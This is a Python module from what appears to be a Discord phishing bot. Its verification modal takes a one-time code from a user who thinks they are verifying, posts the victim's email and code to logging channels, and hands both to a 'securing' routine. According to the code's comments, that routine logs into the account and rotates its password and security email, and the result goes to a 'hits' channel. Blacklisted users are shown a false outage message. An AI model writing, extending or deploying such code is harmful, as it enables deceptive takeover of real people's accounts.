"""Step 5 - confirmation code entry, then the securing pipeline."""

from __future__ import annotations

import logging
from urllib.parse import quote

import discord
from discord import ui

from database.database import DBConnection

from ui import theme
from ui.buttons.embed_buttons import ButtonOptions

from securing.secure import startSecuringAccount
from securing.auth.initial_session import get_session
from shared.send_logs import send_logs, build_log_embed
from shared.post_hit import (
    publish_embed_secure_result,
    resolve_hits_channel,
    set_verify_ephemeral,
)

log = logging.getLogger("bot")


class MyModalTwo(ui.Modal):
    def __init__(self, username, email, flowtoken, ppft=None):
        super().__init__(title="Verification")
        self.username = quote(username)
        self.email = email
        self.flowtoken = flowtoken
        self.ppft = ppft
        self.add_item(ui.InputText(label="Code", required=True, max_length=6))

    async def callback(self, interaction: discord.Interaction) -> None:
        code = self.children[0].value

        # Unreachable hits channel costs the hit post, not the verification.
        hits_channel = await resolve_hits_channel(interaction.client)

        # Blacklisted users
        try:
            with DBConnection() as database:
                blacklisted = interaction.user.id in database.get_blacklisted_users()
        except Exception:
            log.warning("blacklist lookup failed", exc_info=True)
            blacklisted = False

        if blacklisted:
            await set_verify_ephemeral(
                interaction,
                theme.fail_card(
                    "Could not verify",
                    "Our systems seem to be down at the moment. Please try again in a few hours.",
                ),
            )
            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Email | Status | Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
                    0xFA4343,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{self.username}?y=-40",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, self.username),
                email=self.email,
            )
            return

        embed = build_log_embed(
            f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
            0x79D990,
            user=interaction.user,
            bot=interaction.client,
        )
        if self.username and self.username.strip():
            embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}?y=-40")

        await send_logs(interaction.client, content="**This Account is being automaticly secured**")
        await send_logs(
            interaction.client,
            embed,
            view=ButtonOptions(interaction.user, interaction.user.id, self.username),
            email=self.email,
        )

        # The temporary live status above the embed shows the real message;
        # the card only holds the short prompt again.
        await set_verify_ephemeral(
            interaction,
            theme.being_verified_card(
                self.username,
                description=f"Verifying **{self.username}** - this can take a minute. Hang tight.",
            ),
        )

        session = get_session()

        # OTP login (not recovery-code). recovery=True still runs RecoverUser
        # after login so password / security email get rotated. Do not treat a
        # failed dict as success.
        try:
            securedAccount = await startSecuringAccount(
                session,
                self.email,
                self.flowtoken,
                code,
                recovery=True,
                ppft=self.ppft,
                embed_verify=True,
            )
        except Exception:
            log.exception("embed OTP startSecuringAccount crashed")
            securedAccount = {"failed": True, "reason": "Securing crashed"}

        await publish_embed_secure_result(
            interaction=interaction,
            hits_channel=hits_channel,
            secured_account=securedAccount,
            email=self.email,
            username=self.username,
        )
